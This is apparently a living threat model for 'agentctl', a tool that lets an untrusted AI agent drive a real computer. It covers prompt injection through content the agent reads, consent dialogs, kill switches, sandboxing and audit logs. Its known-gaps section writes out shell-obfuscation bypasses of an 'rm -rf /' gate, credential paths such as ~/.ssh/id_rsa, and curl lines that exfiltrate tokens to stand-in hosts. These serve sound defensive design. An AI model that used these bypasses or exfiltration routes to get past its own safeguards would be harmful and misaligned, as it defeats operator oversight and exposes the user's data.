# Threat model

_Living document. Update it whenever a `dangerous`-tier tool or a control changes._

## 1. Scope and assumptions

`agentctl` gives a remote AI agent structured control of a real computer. This document states who might
attack it, what they would be after, which control stands in the way, and, the part that matters most,
where each control's limits actually are.

Assumptions the design rests on:

- The server runs as an **ordinary user**, never root. `privilege_run` is unimplemented on purpose: root
  defeats every other control here.
- The **driving agent is untrusted**. A model that reads a web page, a document, a terminal buffer or an
  accessibility tree is reading text an attacker may have authored. Nothing may depend on the model
  behaving well.
- The **operating system is trusted**, along with its permission model (TCC on macOS) and its filesystem
  semantics.
- The **operator is trusted** to configure the server. Enabling `terminal` with `allow_shell = true` is a
  decision to permit arbitrary code execution, and the server will honour it.
- The **MCP client is inside the trust boundary**. It owns the stdio pipe and holds the OS permissions. A
  compromised client is not a scenario this design defends against; it is game over.

## 2. Actors

| Actor | Capability | Motivation |
|---|---|---|
| **Prompt-injected agent** | Issues any tool call the policy permits, in any order, with any arguments. Cannot see or answer consent prompts. The primary adversary. | Exfiltrate credentials, persist, pivot, cover tracks. |
| **Malicious web page** | Controls page text, DOM, JavaScript dialogs and network responses reaching `browser_*` tools. Its text becomes agent input. | Inject instructions into the agent; reach internal network via the browser. |
| **Malicious local content** | Controls file contents, terminal output, `man` pages, and the names and values in an application's accessibility tree. | Same as above, through a different channel. |
| **Local unprivileged process** | Same user or another user on the machine; can connect to a loopback port and read world-readable files. | Reach the HTTP transport, read the audit log, tamper with config. |
| **A web page in the operator's own browser** | Can make the browser POST to `127.0.0.1`. | Reach the HTTP transport through the operator's browser. |
| **Compromised MCP client** | Owns the pipe; holds the OS permissions. | Out of scope, as above. |

## 3. Assets

- **Credentials**: keychain items, `~/.ssh`, `~/.aws`, `.netrc`, `.npmrc`, browser cookies, the HTTP
  transport token.
- **User data**: everything inside the configured filesystem roots, and everything reachable by an
  application the agent can drive.
- **The desktop session**: keystrokes go to whatever is frontmost, so focus is itself an asset: text
  intended for a text editor can land in a shell.
- **Network position**: the machine may reach internal services, cloud metadata endpoints and admin panels
  that the outside world cannot.
- **The controls themselves**: `config.toml`, the audit log, and the `STOP` file. An attacker who can edit
  these has defeated everything downstream.
- **The human's attention**: a finite resource. Too many prompts and people click Allow reflexively.

## 4. Trust boundaries

```
   untrusted                          |  trusted
   ---------------------------------- + ----------------------------------
   driving agent  ──stdio/HTTP──►  transport  ──►  handle_line
                                                        │
   web page / file / terminal  ─────results────►   dispatch_call   ◄── the choke point
   (content, not instructions)                          │
                                            ┌───────────┴───────────┐
                                       policy gate            audit sink
                                            │                      │
                                         engines ──► OS      ~/.agentctl
                                            │
                                    consent dialog ──► human   (out of band; the
                                                               agent cannot see
                                                               or answer it)
```

Every tool call crosses exactly one boundary, at `Server::dispatch_call`. Engines depend on shared types
and their own backends, never on the core, so no engine can reach around the gate to reach an OS API the
gate would have refused.

## 5. Controls

| Control | Where | What it stops |
|---|---|---|
| Category gate | `mcp-policy::Policy::gate` | Whole capability areas an operator did not enable. Disabled categories are not even advertised in `tools/list`. |
| Tier gate + `policy.enable` | same | Dangerous tools inside an enabled category. Enabling a category never enables its dangerous tools. |
| Consent channel | `mcp-policy::consent` | Unattended high-impact actions. Native dialog, default button Deny, timeout denies. Engines *describe* risk; only the core may ask, so nothing approves itself. |
| Prompt budget | `PromptBudget` | Consent fatigue. Past `max_consent_prompts`, further requests are denied without prompting. |
| Denial budget | `DenialBudget` | An agent spinning against the gate. |
| Kill switch | `mcp-policy::KillSwitch` | Everything, immediately. Checked before every policy decision. Trips on the STOP file, or from inside when a human takes the mouse; the reason is recorded and persisted. |
| Human override | `mcp-input::human_override` + `agentctl::override_watch` | An agent doing the wrong thing while a person is watching. Reaching for the mouse is the reflex people already have, so it is the interrupt worth honouring: while agentctl is driving, a sustained divergence between where the pointer is and where the server put it trips the kill switch, cancels any drag, and posts a notification. Keyboard has no equivalent signal and is out of scope. |
| Destructive-keystroke gate | `mcp-policy::is_destructive` + `input::screens_as_terminal` | `rm -rf /` typed into a shell. Asks the *live input target*, and an undeterminable target screens as a terminal: unknown destination is not evidence of safety. |
| Path jail | `mcp-fs::Jail` | Reading or writing outside the roots. Resolves *then* checks, defeating `..` and symlinked parents. Credential paths and the server's own state directory are denied even inside a root. |
| SSRF guard | `mcp-net::ssrf` | Reaching loopback, private ranges, link-local and cloud metadata. Judges the *resolved* address; redirects disabled. |
| argv execution | `mcp-proc` | Shell metacharacter injection. No shell unless `allow_shell` is on. |
| Redaction | `mcp-policy::Redactor` | Secrets in results *and* in the audit log. |
| No plaintext secret read | `mcp-sec` | Exfiltration of keychain values. The capability does not exist. |
| Foreground refusal (`input.foreground = "never"`; `"polite"` borrows and returns the desktop) | Tool layer: `mcp-input::tool_refusal`, `mcp-window::tool_refusal`; backend boundary: `mcp-input::ForegroundInput`, `mcp-window::ForegroundWindow`, wired in `agentctl::engines` | Agentctl itself taking the user's pointer, keyboard or foreground while they work. See the note below the table. Config or `AGENTCTL_FOREGROUND` only; roles, `access` profiles and tool arguments cannot change it, and the environment can add `never` but not remove it. |
| Pinned-target raise-or-refuse | `mcp-macos::ensure_target_frontmost` | Keystrokes landing in the wrong window. Refuses to type if it cannot raise the intended app. |
| Frame cap | `mcp-core::DEFAULT_MAX_FRAME_BYTES` | Memory exhaustion before any policy runs. |
| HTTP: loopback bind, bearer token, `Origin` refusal | `mcp-core::http` | Network reachability, unauthenticated access, and drive-by requests from the operator's own browser. |
| Protected package set | `mcp-pkg` | Uninstalling the agent, the package manager, or security tooling. Not configurable. |
| Argument invariants | `mcp-policy::HardInvariants`, checked in `dispatch_call` before the gate | A protected path or denied domain named anywhere in a call's arguments, even under `access = "bypass"`. Every token of every string, `file:` URLs, URLs with userinfo, paths after symlink resolution. A heuristic over text (§7). |
| PII token sinks | `Policy::check_token_sink`, before the gate | A tokenized value (`<SSN_1>`) being de-tokenized into a URL, command, file or request. Plaintext is restored only for local input tools; a token anywhere else is refused whatever the profile. Off unless `policy.anonymize`. |
| Roles | `mcp-policy::role` | One session doing more than its job needs. A role narrows visible tools, can add consent and lower the denial budget; it can never widen, raise or disable anything, and an unknown role setting is a config error. |
| Audit log | `mcp-policy::AuditSink` | Nothing, but it is how you find out what happened. Records are hash-chained and Ed25519-signed; with an operator key (`policy.audit_signing_key`, 0600 or the server will not start) `audit verify --pubkey` detects a deleted, reordered, edited or re-signed record. |

**What `foreground = "never"` guarantees, and what it does not.** With `never`, agentctl's own desktop tools
post no synthetic pointer, key or scroll event, hold no key, and ask no app or window to come to the front.
Each tool that would is refused with `POLICY_DENIED` before it runs, and the same refusal sits at the
backend boundary, so a tool added later still posts nothing. `launch` asks the OS not to activate the app
(`open -g` on macOS) and is refused where the platform has no such request (Linux). The accessibility tools
(`set_value`, `select_text`, the other `ui_action` actions, `get_ui_tree`, the window and menu reads)
keep working and never raise anything themselves; so does `focus_app` with `activate: false`, which pins an app
as the target of later calls and writes nothing to it. Setting keyboard focus on an element (`ui_action`
`focus`) is allowed on macOS, where it was measured: against TextEdit with Finder frontmost, three runs left
the topmost window and the active application on Finder. It stays refused on other platforms, where it was
not measured. The rest are refused, and for them it is now a measured fact and not only a precaution, on
macOS: `ui_action` `show_menu` and `select` with an option bring TextEdit forward, `menu_open` and
`menu_invoke` leave a menu on screen above the user's app, and `control_window` `restore` puts the
restored window above Finder's (`control_window` `focus` raises by definition). Each was observed once
against TextEdit; an operation that raises an app in one run is refused whatever it does in another. It does not
promise:

- That an application stays behind. An app may raise itself in answer to an accessibility action it
  accepted, and a launched app may take focus despite the request not to activate it.
- Anything about the browser engine. `browser_*` tools drive Chrome over DevTools, not through system input,
  so they never move the pointer, but a visible (headed) browser is another matter: the engine calls
  `Page.bringToFront` on the first connection to a tab, `browser_tabs` `open` and `activate` bring a tab
  forward, and a headed `browser_launch` starts a visible window. None of that is gated by `foreground`.
  It is out of scope here because covering it means changing how the browser engine connects to every tab,
  a separate change; until then, `headless` is the way to keep a browser out of the user's way.
- Anything about programs the agent starts. `exec` and `pty_*` run arbitrary commands, and a command can
  open an app or send keys (`open`, `osascript`); the command allowlist, not `foreground`, limits that.
- The clipboard. `clipboard_write` changes what the user will paste; it moves nothing and is not refused.
- The OS choosing a new frontmost app after `close_app` ends the one that was in front.

The refusal appears in the audit log as an ordinary `POLICY_DENIED` result for the tool; the log records the
code, not the message.

**A locked screen.** Separate from `foreground`, and applied under every setting: while the screen is
locked, or another user's session has the console, macOS discards posted key and pointer events and the
post reports success. Every call that posts such events (the `hid` and `pid_event` routes, and the window
calls that raise an app) is refused first with a retryable `ACTION_FAILED`, at the tool layer and again at the
input backend, and `polite` does not wait for idle first. This protects the report ("done" is never said for an
event the system threw away); it is not a security boundary, and it does not stop reads, which return what the
locked session shows (little: the accessibility tree is the bare application, capture fails). A display that
is only asleep, unlocked, is not treated as blocking. On Linux the state is not readable from the input
backend, so nothing is refused there.

**Keys sent to a background app by process.** With the app pinned (`focus_app`, `activate: false`) and not
frontmost, `keyboard_type` and `keyboard_shortcut` post their key events to that process alone
(`input: "pid_event"`), so under `never` they are allowed: measured on macOS, they arrived in TextEdit
behind Finder while the topmost window, the active application, Finder's focused element and the pointer
stayed put. Keys that would go to the frontmost app are still refused. Per-process delivery is a courtesy
of the OS, not a gate: the destructive-command screen applies to the pinned app by name, exactly as it does
to the frontmost one, but nothing stops the receiving app from doing whatever the keys ask.

**What `foreground = "polite"` does, and what it does not.** `polite` sits between `allow` and `never`
(`never` is stricter, `allow` looser; `AGENTCTL_FOREGROUND` can only move a setting toward `never`, so
`polite` from the environment applies over `allow` in the file and never loosens a file's `polite` or
`never`). An action that needs the real pointer or keyboard, or to raise an app, waits until the
person has been idle for `input.polite_idle_ms` (1500 by default; the OS idle clock, with agentctl's own
input not counted as the person), up to `input.polite_max_wait_ms` (15000), then fails with a retryable
`TIMEOUT` ("the user is active") having done nothing. Otherwise it records the frontmost app and the
pointer, acts, and puts both back, on error paths too; a batch (`input_steps`) borrows once for all its
steps. If the person moves the pointer part way, the action is abandoned (buttons and keys are released) and
the call fails with the same retryable error; the app is put back but the pointer is left in their hand.
In this mode the human-override watcher abandons the action instead of tripping the kill switch
(`agentctl/src/override_watch.rs`); under `allow` it still trips it, and the STOP file stops every call in every mode.

This is courtesy, not containment:

- It protects a person who is idle from being surprised, and a person who is moving the mouse from being
  fought. It does not limit what the borrowed app does while it is in front, or what keys the agent sends it.
- Keyboard use is only noticed when a call starts (the idle clock covers it), not mid-action: detecting
  typing while the agent acts would take a global key tap, which agentctl does not install.
- Restoring is best effort and reported: the result's `polite.returned` says whether the app and the pointer
  were back, and an app that was closed meanwhile cannot be. A call costs about half a second more, spent
  watching for an app that is slow to come forward.
- A key held with `keyboard_shortcut` `down` is refused: it outlives the call, so it cannot be given back.
- `focus_app` and `control_window focus` raise the app only for the length of the call (`focus_app` still pins
  it). Where the platform cannot tell when the person is idle (Linux), a call that needs the desktop is
  refused rather than guessed. The same gaps as `never` apply: `exec`, a headed browser, an app raising itself.

Full mapping to OWASP categories is in [`architecture.md`](architecture.md) §8.

## 6. Abuse cases by category

| Category | Abuse case | Mitigation | Residual risk |
|---|---|---|---|
| vision | Screenshot a password manager; read a secure field | Secure fields are marked and their values never returned; capture needs the Screen Recording grant | A screenshot of a *visible* secret is still a screenshot. Vision is a read of the screen; that is what it is for. |
| input | Type `rm -rf /` into a terminal; click "Allow" on a system dialog | Destructive-keystroke gate on the live input target; consent dialogs are separate native windows the agent cannot see | The gate is a backstop, not containment (§7) |
| window | Close an app with unsaved work; drive an app not on the allowlist | `allowed_apps`, which `launch`, `focus_app` and every window or capture tool that names an `app` (`list_windows`, `control_window`, `menu_*`, `handle_dialogs`, `wait_for`, `capture_window`, `ocr_region`, `observe`) must meet, by the name given and by the app it resolves to; `close_app` is gated | Data loss inside an allowed app is possible by design. `get_ui_tree`, `find_elements` and `ui_extract` with `app` read an app that `allowed_apps` does not list: the list does not bound perception. `observe` is held to the list for a named app but, like `capture_window`, not for the pinned or frontmost app it reads when none is named; it withholds text drawn on a secure field and leaves out text from areas a covering app owns, but what it returns from an allowed window is that window's text and is marked untrusted |
| desktop | Speak a file's contents aloud to exfiltrate it; power off mid-task | `play_audio` is bounded by the filesystem roots; `power_control` is dangerous-tier | `notify_user` text is attacker-controlled and could mimic a system prompt (§7) |
| browser | Navigate to cloud metadata; read cookies; `eval` arbitrary JS; attach a local file to an attacker's form | `browser_eval`/`browser_cookies`/`browser_network`/`browser_upload` are dangerous-tier; `browser_upload` reads only through the filesystem jail (roots and credential deny-list); cookie values redacted; JS dialogs dismissed by default | `browser_navigate` is origin-prefix checked, **not** IP-guarded (§7) |
| terminal | Arbitrary code execution | argv-only, `allowed_commands` allowlist, `allow_shell` off; PTY writes are gated identically | With `allow_shell = true` this is arbitrary execution, as configured |
| filesystem | Read `~/.ssh/id_rsa`; escape via symlink; delete work | Jail resolves then checks; credential deny-list is case-insensitive; `fs_delete` trashes by default | Hard links are invisible to path resolution (§7) |
| network | Reach an internal admin panel or metadata endpoint | Host allowlist, resolved-address SSRF check, no redirects | An allowlisted public host that proxies inward |
| system | Read another process's memory | Own user only; writes are never implemented; dangerous-tier | Reading one's own user's memory can reveal secrets |
| credentials | Exfiltrate a keychain secret | No plaintext read exists; service allowlist | Metadata (which services exist) is visible |
| packages | Install a backdoor; uninstall the agent | Three independent switches; approval covers the *resolved* dependency set; protected set cannot be uninstalled; no verification-weakening flag is reachable | An approved install is arbitrary code execution, as approved |
| memory | Poison a stored recipe so a later run misbehaves | Steps store selectors, never refs; ambiguous selectors are refused; off by default | A poisoned recipe replays plausible-looking steps |

## 7. Known gaps

These are real, deliberate, and asserted by tests that prove the gap **still exists**, so a heuristic's
limits stay visible instead of being quietly mistaken for containment.

**The destructive-command gate cannot see through shell expansion.**
`crates/mcp-policy/tests/redteam_destructive.rs::documented_known_bypasses` pins five: a base64-encoded
payload under `eval`, variable indirection (`X=rm; Y=-rf; $X $Y /`), `$IFS` as a separator, quote splitting
(`r''m -rf /`), and hex assembly via `printf`. Seeing through any of them means running the shell, which is
the thing being gated. **The real control is the argv allowlist with `allow_shell = false`.** The gate is a
backstop against an agent that has been tricked, not a boundary against one that is trying.

**Hard links are invisible to path resolution.**
`crates/mcp-fs/tests/redteam_jail.rs::documented_known_gap_hard_links`. A hard link has no target to
follow, so a link inside a root pointing at an inode outside it resolves as in-root. The filesystem engine
exposes no hard-link primitive, so creating one requires an actor with out-of-band write access inside a
root, at which point they have that access anyway.

**`browser_navigate` judges the request, not the response.**
Navigation targets go through the same resolved-address guard as `http_request`
(`crates/mcp-browser/src/nav.rs`): only `http`, `https` and `about:blank` are accepted, the allowlist is
matched on the parsed origin rather than as a string prefix, and every address the host resolves to must be
public unless `browser.allow_private` is on. What the guard cannot see is what happens after the request
leaves: a server-side redirect to a private address, or a fetch made by the page's own script, never passes
through it. `crates/mcp-browser/tests/redteam_navigate.rs::documented_known_gap_server_side_redirects_are_not_seen`
pins that. Closing it means intercepting requests at the CDP `Fetch` layer, which is not done. **Set
`browser.allowed_origins`** to the sites the task needs; the address check is a backstop, not the boundary.

**The HTTP transport token is plaintext in `config.toml`.**
Anyone who can read the file can use the transport. The file is in the user's home directory, and the
transport is off by default.

**`notify_user` text is attacker-controlled.**
An agent can display a notification that mimics a system prompt. Consent dialogs are separate native
windows with a distinct title and a Deny default, but a sufficiently convincing notification is a social
engineering surface.

**A capture is a capture.**
Screen capture returns what is on screen, including a secret the human has open. That is the capability,
not a defect in it.

**Content is not instructions, but the agent may read it as such.**
Every perception tool returns text an attacker may have written: page text, file contents, terminal
output, even an application's accessibility labels. Results from those tools now carry
`provenance: "untrusted"`, and text that reads as an instruction aimed at a model is additionally flagged
with `suspicious_instructions` and the phrases that matched.

Both are advisory and neither blocks. A blocking heuristic would be bypassable in one direction and, on a
false positive, would let a web page deny service to the agent reading it. What the marker buys is that a
model reading a flagged result can be told, truthfully, that this text is not from its operator.

The scan reads literal text, in English, in one tool result. It therefore misses encoded payloads,
translations, homoglyphs, paraphrase, an instruction stored behind a pointer, a payload split across two
calls, and anything rendered as an image. All of those are asserted as passing in
`crates/mcp-policy/tests/redteam_injection.rs::documented_known_bypasses`. Closing them would mean
understanding the text, which is the model's job rather than a string matcher's. That is exactly why the
controls that matter are the ones that do not depend on reading intent. **An injection that succeeds
completely still cannot call a tool the operator did not enable.**

**Human override is a convenience, not a containment boundary.**
It notices a person taking the mouse. It cannot notice a person typing. That
would need an event tap watching every keystroke on the machine, and it is
disabled the moment a backend cannot read the pointer, because an unreadable
sensor must never be treated as evidence of interference. It also cannot help
when nobody is at the machine, which is exactly when an autonomous agent runs.
The STOP file remains the control that always works.

**On Linux the override works on X11 only.**
An X11 session can be asked where the pointer is, through `xdotool getmouselocation`, so the watcher runs
there (it needs `xdotool` installed). Wayland gives a client no way to read the pointer's position, and
XWayland is no substitute: it reports the pointer only while it is over an X11 window and holds the last
value afterwards, which would trip the kill switch on nothing. On Wayland `pointer_position` answers
`None`, which the watcher treats as no evidence rather than as interference, so reaching for the mouse
does not stop the agent. That is logged at warn level when the server starts and shown by `agentctl
doctor` as `human takeover: MISSING`. The STOP file, the consent dialog and the portal grant (revocable
from the desktop's settings) are the controls. On X11 with several monitors the pointer's root
coordinates may not match the portal's per-monitor coordinates; this has not been tested.

**The portal grant is a file.**
The remote-desktop approval is remembered as a restore token under `~/.agentctl/bin/`, mode 0600. Any
program running as the same user could present that token to reopen input without a dialog. The same
program could also simply ask the person itself, so the token widens nothing a same-user process could
not already do; it is listed because it is state worth knowing about, and deleting it makes the desktop
ask again.

**Tree coordinates on Wayland are window-relative.**
A Wayland compositor never tells an application where its window is, so the bounds a Wayland-native
toolkit reports over AT-SPI start at (0, 0). A `mouse_action` aimed with those numbers lands in the wrong
place. Coordinates read from `capture_screen` or `ocr_region` are screen-global and correct, and
`ui_action` on a ref needs no coordinate at all. XWayland and X11 applications report global bounds.

**`access = "bypass"` is the operator disarming the gate, on purpose.**
The three permission profiles are a shortcut for enabling every category and dangerous tool. `ask` still
confirms each dangerous action and `auto` refuses destructive ones, but `bypass` turns off consent and the
destructive-command gate entirely: any tool the agent calls runs. It is never a default, is set only in the
operator-owned config (which the filesystem jail keeps the agent from editing), and the kill switch and
human-override still abort in-flight work. It exists because the owner of a machine may legitimately choose
to run wide-open on it; it is not a control the agent can reach or raise.

**A provided password is kept out of the log and away from the judge.**
The owner may hand the agent a password to type. A call flagged `secret: true` (`keyboard_type`,
`set_value`, `pty_write`, `clipboard_write`) has its payload replaced with a length marker in the audit log
(`mcp_policy::redact_flagged_payload`, applied to the logged copy only, in `mcp-core::server`), and the
offline destructive-pattern check still runs while the remote judge is skipped, so the secret never leaves
the machine for TypeSafe. The real value still reaches the OS. The length is visible in the marker; the
value is not. Without the flag the payload is logged verbatim, which is the documented default for ordinary
typed text. A GUI secure field's contents remain unreadable through every perception tool regardless.

**A PII token can still be typed into a field the model chose.**
With `policy.anonymize` on, a token resolves to plaintext only in local input tools (`keyboard_type`,
`set_value`, `ui_fill_form`, `browser_fill_form`, `browser_act`), so `http_request` to
`collector.example/?d=<SSN_1>` is refused. But an input tool delivers plaintext to whatever has focus: a
form on a page the model navigated to, or a terminal where it then types `curl x.example/<SSN_1>`.
`crates/mcp-policy/tests/anonymize.rs::documented_known_bypasses` pins both. Closing it needs a token bound
to the origin or window it was read from, which is not done. Detection is conservative (Luhn-checked
cards, SSA-valid SSNs, phone shapes, emails, MRNs, IPv4 outside version strings, common key prefixes);
anything it does not recognise reaches the model as is. Past 10,000 values a session still masks but can
no longer type the value back.

**Argument invariants read text, not intent.**
They refuse `/etc/sudoers` or a denied domain wherever it appears in the arguments, before the gate. They
cannot see a path relative to a working directory they do not know, shell expansion (`/etc/sha*ow`,
`/e''tc/shadow`, `$(printf ...)`), percent-encoding, an IP address that resolves to a denied host, or a
host written as free text inside a command. `crates/mcp-policy/tests/rbac_invariants.rs::documented_known_bypasses`
pins each. The jail, the argv allowlist and the SSRF guard are the limits; invariants are a backstop that
`bypass` cannot turn off.

**An audit log without an operator key is only self-consistent.**
Unless `policy.audit_signing_key` is set, each session signs with a throwaway key whose public half is in
the log itself, so anyone able to rewrite the file can re-sign it. `audit verify` says "self-consistent
only" for such a log and gives a trusted verdict only with `--pubkey`. The signing key sits on the same
machine as the log: an actor with the operator's file access can sign whatever they like going forward.
Pinning detects tampering by anyone *without* the key; it does not make the host trustworthy. Compliance
exports describe what the log contains and are not a certification.

**Desktop recording listens to a person's real input.**
`desktop_record` is dangerous-tier (named in `policy.enable`), because it is the one tool that reads what a
person types and clicks rather than what an application exposes. On macOS it is a listen-only event tap: it
cannot change or swallow an event, and it needs Input Monitoring (and Accessibility, to read the element
under the pointer), so the system's own grant is the first control; without it the call is `PERM_DENIED` and
records nothing. A session is explicit and bounded (at most 600 s, 4000 events, 200 steps), and a marker
file in the state directory makes `agentctl doctor` print `RECORDING ACTIVE` while one runs. Each event is
resolved to its application immediately; one whose application is not in `allowed_apps`, or that cannot be
resolved, is counted and discarded, not stored. Text typed into a secure field is cleared when it is read,
by the backend and again by the session, and the step holds a `secret_ref` only. What it cannot know: a
secret typed into a field the application does not mark secure (a one-time code in a plain text field) is
recorded verbatim in `desktop_flows.json`, a plain file in the state directory, as the browser recorder's
equivalent is; and a person's keystrokes between the tap seeing them and the element read are attributed to
whatever had the focus then. The human-override watcher samples the pointer only while the server is
driving, so a person's demonstration does not trip the kill switch; it still applies for its 1.5 s grace
after an agent input call, and `desktop_record` itself never arms it. Replay is not a second path: each step is
dispatched as the ordinary tool it stands for through the same gate as `input_steps`, so a role that denies
`keyboard_type`, a consent requirement, `foreground = "never"` and the audit log treat a replayed step as
the call it is; a flow whose steps the foreground mode would refuse is refused before the first runs. Linux
has no listen-only route in the remote-desktop portal, so recording is `UNSUPPORTED_OS` there.

**Recorded flows are what the page showed the recorder.**
`browser_record` never stores a secret field's value: a field is secret by `type=password`, a secret word
in its name or id, or an `autocomplete` token (`one-time-code`, `*-password`, `cc-*`), and the saved step
names a `secret_ref` that the operator supplies at replay (`AGENTCTL_SECRET_<NAME>`). A secret typed into a
field that matches none of those (an SSN in a plain `<input name="q">`) is recorded verbatim in
`browser_flows.json`. The recorder runs in an isolated world, so page script cannot call its binding or
read its state, and it records an event only if the browser made it (`isTrusted`) or agentctl armed it:
while a tab is recorded, `browser_act` and `browser_fill_form` run in that same isolated world and, just
before each synthetic `click`, `input` or `change` they dispatch, queue one expectation (type and target)
that the recorder uses up on the first matching event. Page script cannot reach that world, so its own
`el.click()`, `dispatchEvent` and synthetic Enter are dropped, and so is a handler that re-dispatches the
agent's event (the recorder's capture listener consumes the agent's event first). What a page can still do:
change what a trusted or armed event carries or points at. The recorder reads a field's value in its capture
listener, before page handlers for that event run, but a handler of an earlier event (the agent's `input`
before its `change`) or a script that edits the field between a person's keystrokes changes what is read
next; an overlay can put a different element under a real click; and a person who clicks where the page
tells them to is recorded doing so. A canvas-region click is a real pointer event and needs no arming.
Review a recording before replaying it with consent.

**A client can withhold its own reply, never a stop.**
A `notifications/cancelled` marks the call client-cancelled and the server sends no response (stdio writes
nothing, HTTP answers 202), as the MCP spec asks. The pre and post audit records are written either way,
and only an explicit cancel sets the mark, so a kill-switch stop is always answered. Over HTTP, 64
concurrent connections (`max_connections`) are allowed; when all of them hold running calls, a cancel POST
is refused with 503 until one finishes.

**The judge is a second opinion, not a boundary.**
`[judge]` sends text to a remote model and gets a probability back. Its own documentation says adversarial
content can move its answers, so it is wired where that cannot matter: `judged_destructive` runs the
pattern check first and asks the judge only when the patterns found nothing, a yes adds a flag and a no
changes nothing; `second_opinion_on_content` can set `suspicious_instructions` and never clear it; the
`describe` ranking and the `judge` wait condition inform the agent and gate no permission. There is no code
path on which a judgment allows anything. `crates/mcp-policy/tests/redteam_judge.rs` scripts the service
to say the most convenient thing an attacker could wish for and asserts the deterministic answer stands.
What does leave the machine is data: element names and values, window titles, page text after redaction,
typed commands, cut to `judge.max_state_bytes`. Secure fields never carry their value into a snapshot, so
they never reach it. The key is read from the environment or a mode-600 file and is never printed, never
in argv, and never in `agentctl config print`.

**OCR models are fetched, not shipped.**
`ocr_region` on Linux downloads two model files from the `ocrs` project's bucket on first use, over
HTTPS, without a pinned checksum. A tampered model can misread text; it cannot execute anything, because
`rten` interprets it. An operator who does not want the download places the files by hand, or points
`AGENTCTL_OCR_MODELS` at a directory that has them; `agentctl doctor` reports which is in effect.

## 8. Out of scope, by choice

- **`privilege_run` / running as root.** Root defeats every control above.
- **Process-memory writes.** Reading is dangerous-tier and own-user-only; writing is a deliberate never.
- **Defending against a compromised MCP client.** It owns the pipe and the permissions.
- **Defending the operator from their own configuration.** The server does what it is told; it just makes
  sure it was told.

## 9. Review cadence

Update this document when any of the following changes: a `dangerous`-tier tool is added or a tool's tier
moves; anything under `crates/mcp-policy` or `crates/mcp-sec`; the jail, the SSRF guard, the destructive
gate, the consent channel, the kill switch, redaction, the audit sink, or `dispatch_call`. The pull request
template asks for it.
